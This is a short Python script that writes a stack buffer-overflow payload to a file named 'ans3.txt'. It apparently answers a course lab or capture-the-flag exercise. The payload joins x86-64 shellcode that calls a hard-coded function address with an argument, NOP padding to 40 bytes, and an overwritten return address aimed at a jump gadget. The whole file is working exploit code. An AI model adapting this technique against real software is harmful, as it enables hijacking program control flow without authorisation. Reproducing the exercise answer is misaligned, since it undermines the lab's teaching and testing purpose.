import struct

shellcode = (
    b"\x48\xc7\xc7\x72\x00\x00\x00"  
    b"\x48\xc7\xc0\x16\x12\x40\x00"  
    b"\xff\xd0"                      
)

padding_length = 40 - len(shellcode)
padding = b'\x90' * padding_length 



jmp_xs_addr = 0x401334
ret_addr = struct.pack('<Q', jmp_xs_addr)

payload = shellcode + padding + ret_addr


with open("ans3.txt", "wb") as f:
    f.write(payload)

